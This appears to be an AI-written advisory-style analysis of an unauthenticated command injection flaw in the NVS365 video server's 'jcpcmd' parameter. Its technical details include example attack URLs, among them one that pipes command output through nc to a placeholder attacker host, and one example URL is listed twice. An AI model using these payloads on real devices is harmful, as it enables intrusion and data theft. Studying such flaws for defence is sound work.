Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The NVS365 network video server has a vulnerability that allows arbitrary command execution through a crafted URL. Specifically, the `jcpcmd` parameter in the URL is vulnerable to command injection.

**Weaknesses/Vulnerabilities Present:**
- **Command Injection:** The primary vulnerability is a command injection flaw where user-supplied input to the `jcpcmd` parameter is not sanitized or validated, allowing an attacker to inject and execute arbitrary system commands.
- **Unauthenticated Access (Potentially):** The provided information states that the command execution vulnerability can be triggered without prior login.

**Impact of Exploitation:**
- **Arbitrary Command Execution:** Attackers can execute arbitrary commands on the server.
- **Shell Access:** Successful command injection can lead to gaining a shell on the server with root privileges.
- **Full System Compromise:** With root access, an attacker can fully compromise the server, potentially installing malware, accessing sensitive data, or causing denial-of-service.

**Attack Vectors:**
- **HTTP GET Request:** The attack vector involves sending a crafted HTTP GET request to the server, specifically targeting the `jcpcmd` parameter with malicious commands.
- **URL Manipulation:** By modifying the `jcpcmd` parameter within the URL, an attacker can specify commands to execute.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to have network access to the vulnerable NVS365 server.
- **Knowledge of Vulnerable Parameter:** The attacker must know about the existence of the vulnerable `jcpcmd` parameter.
- **Craft HTTP request:** The attacker has to craft HTTP GET requests to inject malicious commands.

**Technical Details:**
- The specific vulnerable parameter is `jcpcmd`.
- Example attack URLs:
  - `http://<server_ip>:8085/?jcpcmd=userpasswd -act list`
  - `http://<server_ip>:8085/?jcpcmd=userpasswd -act list` (to view user info which could be used to find passwords if the related vulnerability is exploited)
  - `http://<server_ip>:8085/?jcpcmd=address=|pwd|nc <attacker_ip> <attacker_port> &size=16` to execute the `pwd` command and send results to attacker ip.
- Example of using metasploit to get a shell.
